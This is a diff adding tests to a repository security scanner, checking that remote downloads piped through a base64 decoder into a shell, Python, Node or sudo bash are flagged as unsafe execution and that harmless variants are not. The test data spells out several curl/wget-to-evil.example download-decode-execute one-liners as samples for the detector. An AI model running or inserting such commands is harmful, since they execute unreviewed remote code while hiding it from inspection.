@@ -82,6 +82,84 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
   }
 });
 
+/**
+ * A decoder between the download and the executor is the same act with
+ * one obfuscating step added: `curl … | base64 -d | sh` runs the
+ * downloaded bytes exactly like `curl … | sh`. The pipe rules require
+ * the executor immediately after the first pipe, so the decoded forms
+ * matched nothing.
+ */
+const DECODED: Record<string, string> = {
+  "curl | base64 -d | sh":
+    "curl -s https://evil.example/x.b64 | base64 -d | sh",
+  "curl | base64 --decode | bash":
+    "curl -s https://evil.example/x.b64 | base64 --decode | bash",
+  "wget | base64 -d | /bin/sh":
+    "wget -qO- https://evil.example/x.b64 | base64 -d | /bin/sh",
+  "curl | /usr/bin/base64 -d | sh":
+    "curl -s https://evil.example/x.b64 | /usr/bin/base64 -d | sh",
+  "curl | openssl base64 -d | sh":
+    "curl -s https://evil.example/x.b64 | openssl base64 -d | sh",
+  "curl | openssl enc -d -base64 | bash":
+    "curl -s https://evil.example/x.b64 | openssl enc -d -base64 | bash",
+  "curl | base64 -d | python3":
+    "curl -s https://evil.example/x.b64 | base64 -d | python3",
+  "curl | base64 -d | node":
+    "curl -s https://evil.example/x.b64 | base64 -d | node",
+  "curl | base64 -d | sudo bash":
+    "curl -s https://evil.example/x.b64 | base64 -d | sudo bash",
+};
+
+test("a remote download piped through a decoder into a shell or interpreter is unsafe execution", () => {
+  for (const [name, body] of Object.entries(DECODED)) {
+    const inspection = inspectRepository({
+      files: [
+        {
+          path: "scripts/bootstrap.sh",
+          bytes: new TextEncoder().encode(`${body}\n`),
+        },
+      ],
+    });
+    expect({
+      name,
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+    }).toEqual({
+      name,
+      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
+    });
+  }
+});
+
+test("a decoded download that is not executed, and a decode with no download, keep no finding", () => {
+  for (const body of [
+    // Decoded, but handed to a checksum, a file or a save — never run.
+    "curl -s https://example.com/data.b64 | base64 -d | sha256sum",
+    "curl -s https://example.com/data.b64 | base64 -d > decoded.bin",
+    "curl -s https://example.com/x.b64 | base64 -d | tee x.sh",
+    // Encoded, not decoded: the shell receives base64 text, not the payload.
+    "curl -s https://example.com/data | base64 | sh",
+    // Decoded and run, but the pipe carries a local file, not a download.
+    "cat payload.b64 | base64 -d | sh",
+  ]) {
+    const inspection = inspectRepository({
+      files: [
+        {
+          path: "scripts/fetch.sh",
+          bytes: new TextEncoder().encode(`${body}\n`),
+        },
+      ],
+    });
+    expect({
+      body,
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+    }).toEqual({ body, findings: [] });
+  }
+});
+
 test("changed execution rules cannot reuse the old clean source inventory", () => {
   const inspection = inspectRepository({
     files: [
